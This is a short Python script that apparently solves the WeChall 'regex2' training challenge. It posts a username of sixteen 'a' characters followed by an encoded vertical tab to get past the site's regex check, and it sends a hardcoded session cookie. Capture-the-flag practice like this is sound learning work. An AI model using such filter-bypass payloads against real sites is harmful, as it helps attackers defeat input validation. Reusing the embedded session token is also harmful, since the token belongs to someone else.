import requests

url = 'https://www.wechall.net/challenge/training/regex2/index.php'
WC = '17998104-12786-VfKrTIjbSko90Xgs'

postData = {'username':'a'*16 + '%0b', 'submit':'Submit'}
cookie = {'WC':WC}

resp = requests.post(url, data=postData, cookies=cookie)

print(resp.text)